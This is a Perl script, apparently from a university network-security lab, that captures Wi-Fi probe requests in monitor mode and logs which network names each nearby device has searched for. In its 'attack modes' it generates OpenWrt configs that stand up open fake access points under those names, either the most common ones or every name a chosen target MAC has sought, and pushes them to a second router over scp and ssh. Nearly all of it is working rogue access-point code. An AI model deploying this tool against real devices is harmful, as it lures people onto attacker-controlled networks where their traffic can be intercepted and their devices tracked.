#!/usr/bin/perl
 
# Probe request line:
#|      0        |           |    |   |    |    |   |   |     |      |       | |               |            |      14            |    |        |
# 16:55:45.721519 141432288us tsft 1.0 Mb/s 2412 MHz 11b -86dB signal antenna 1 BSSID:Broadcast DA:Broadcast SA:e8:3e:b6:df:b3:5b (oui Unknown)
#
|     |       |   19    |     |    |    |     |     |
# Probe Request (Sitecom) [1.0* 2.0* 5.5* 11.0* Mbit]
 
my $debug = 1;  	# debug mode (show some output)
my $attackMode = 1;
my $targetMAC = "XX:XX:XX:XX:XX";
my $lines = 30;
# 1 - Unique SSID
# 2 - Direct attack, necessary to provide $targetMAC address
 
# Checking for mon0 interface
system("grep -q mon0 /proc/net/dev || /usr/sbin/iw phy phy0 interface add mon0 type monitor;/sbin/ifconfig mon0 up;");
# Interface reload (sometimes are necessary to reload monitor interface)
if ($debug == 1) { print("mon0 restart ... "); }
system("ifconfig mon0 down;sleep 5;ifconfig mon0 up");
 
$|=1;
open (STDIN,"/usr/sbin/tcpdump -e -i mon0 | grep -i request |");
 
my %data = ();  	# hash table for MAC, SSID pair
my %uniqSSID = (); 	# this hash table contains unique SSID names
my $counter = 0;	# Counter for lines
 
while (<>) {
# Variable $_ contain latest line from TCPdump output
    while ($_ =~/(BSSID:Broadcast)/g) { # looking for lines where BSSID have "Broadcast" value
        $line = $_;
        ( $ssid ) = $line =~ m/Request \(\s*(((?!\Request \(|\)).)+)\s*\)/;	# Getting SSID name from latest line. SSID are between "Request (" and ")"
        @values = split(' ',$line);	# Splitting latest line which contains BSSID:Broadcast
        $time=$values[0];	# Getting time from @values array
        $mac=substr($values[14],3);	# Getting MAC address from array
        $dB=$values[8];	# Getting signal strength
		# dB conversion: 
		# http://www.tamos.com/htmlhelp/commwifi/understandingsignalstrength.htm
        # Percentage: -35dBm at 100% and -95dBm at 0%
 
		# if $ssid variable isn’t  empty and different than uVa known SSIDs and $mac variable contains correct MAC address format 
        if ($ssid && $ssid ne "SNElab" && $ssid ne "eduroam" && $ssid ne "UvAcongress" && $ssid ne "UvAguests" && $mac =~ /..:..:..:..:../ ) {
            if( !($data{$mac}) ) {	# Checking for unique MAC addresses
                push( @{$data{$mac}}, $ssid ); # If current MAC address aren't in @data hash table, Script pushing SSID
				if ($debug == 1) { print "\nNew unique mac -> ".$mac."\n"; }
			} elsif ( ! ("@{$data{$mac}}" =~ /$ssid/ ) ) { # Regex checking for existing SSID names 
                push( @{$data{$mac}}, $ssid );  # If SSID are unique , push SSID for MAC
            }
 
            if ( ! ("@{$uniqSSID}" =~ /$ssid/) ) { # Checking for unique SSID name
                push( @{$uniqSSID}, $ssid ); # If SSID aren't in @uniqSSID hash table, script pushing SSID name
            }
 
            if ($debug == 1) { print "TIME: ".$time."\tMAC: ".$mac."\tPOWER: ".$dB."\tSSID: ".$ssid."\n"; }
 
			if ($attackMode == 1) {
				$counter++; # Loop Counter
 
				if ($counter == $lines) {
					$count = keys %data;
 
					if ($debug == 1) { print "\nDebug Hash table ($count unique MAC's);\n"; }
 
					my $topCounter = 0;
					# Generating config file for top 7 unique SSID's
 
					open (MYFILE, '> SSID_UNIQ.config');
                    print MYFILE "config wifi-device  radio0\n";
                    print MYFILE "\toption type     mac80211\n";
                    print MYFILE "\toption channel  9\n";
                    print MYFILE "\toption macaddr  b0:48:7a:db:5d:92\n";
                    print MYFILE "\toption hwmode   11g\n";
                    print MYFILE "\toption htmode   HT20\n";
                    print MYFILE "\tlist ht_capab   SHORT-GI-40\n";
                    print MYFILE "\tlist ht_capab   DSSS_CCK-40\n";
 
		#	foreach $uniqTemp (uniq @{$uniqSSID}) {^M
 		# create unique SSIDs
                    foreach $uniqTemp (@{$uniqSSID}) {
                        print MYFILE "config wifi-iface\n";
                        print MYFILE "\toption device   radio0\n";
                        print MYFILE "\toption network  lan\n";
                        print MYFILE "\toption mode     ap\n";
                        print MYFILE "\toption ssid     \"".$uniqTemp."\"\n";
                        print MYFILE "\toption encryption none\n\n";
 
						if ($topCounter == 6) { last; } # If script get 7 unique SSID - exit from loop
                        $topCounter++; # Incrementing loop count
                    }
                    close (MYFILE);
 
					if ($debug == 1) { 
						print "\nHash cleaning\n"; 
						foreach $unique (@{$uniqSSID}) { 
							print $unique."\n";
						}
					}
 
                    $uniqSSID = ();                                                                                                         
 
                    if ($debug == 1) { print "Sending new config file\n"; }
                    system ("scp -i ~/\.ssh/id_rsa SSID_UNIQ.config root\@192\.168\.1\.2:/etc/config/wireless"); # sending config file
# during secure copy procedure, we generate RSA key so that we don’t need any password for our secure communication between the two routers. 
					if ($debug == 1) { print "Restarting remote interfaces with new configure\n"; }
                    system ("ssh -i ~/\.ssh/id_rsa root\@192\.168\.1\.2 wifi reload"); # sending wifi reload command to remote server
#in order to get the next conf file, we have to reload the wifi interfaces, in order to get the new configuration.
                    $counter = 0;                                                                                                                                    
				}
			} # End of Attack Mode == 1
 
			if ($attackMode == 2) {																					
				$counter++; # Loop Counter
				if ($counter == $lines) {
					foreach $macTemp (sort keys %data) {
                       	if ($debug == 1) {
							print "$macTemp: @{$data{$macTemp}}\n";
							print "MAC: $macTemp\n";
						}
 
						if ($macTemp eq $targetMAC) { # comparing KEY with target MAC address
							if ($debug == 1) {print "\tGenerating config file for ".$targetMAC."\n"; }
                            open (MYFILE, '> SSID_MAC.config');
 
                            print MYFILE "config wifi-device  radio0\n\n";
 
                            print MYFILE "option type     mac80211\n";
                            print MYFILE "option channel  11\n";
                            print MYFILE "option macaddr  b0:48:7a:db:5d:92\n";
                            print MYFILE "option hwmode   11ng\n";
                            print MYFILE "option htmode   HT20\n";
                            print MYFILE "list ht_capab   SHORT-GI-40\n";
                            print MYFILE "list ht_capab   DSSS_CCK-40\n";
 
                            foreach $ssidTemp (sort @{$data{$targetMAC}}) {
								if ($debug == 1) {
									print "\t".$ssidTemp."\n";
								}
 
                                print MYFILE "# ".$macTemp." -> ".$ssidTemp."\n";
                                print MYFILE "config wifi-iface\n";
                                print MYFILE "\toption device   radio0\n";
                                print MYFILE "\toption network  lan\n";
                                print MYFILE "\toption mode     ap\n";
                                print MYFILE "\toption ssid     \"".$ssidTemp."\"\n";
                                print MYFILE "\toption encryption none\n\n";
                            }
                            close (MYFILE);
 
							if ($debug == 1) { print "\n\nSending new config file\n"; }
                            system ("scp -i ~/\.ssh/id_rsa SSID_MAC.config root\@192\.168\.1\.2:/etc/config/wireless"); # sending config file to remote server
                            if ($debug == 1) { print "Restarting remote interfaces with new configure\n"; }
							system ("ssh -i ~/\.ssh/id_rsa root\@192\.168\.1\.2 wifi reload"); # sending wifi reload command to remote server
						}
					}
				}
			}
		}
	}
} # End of while(<>) loop
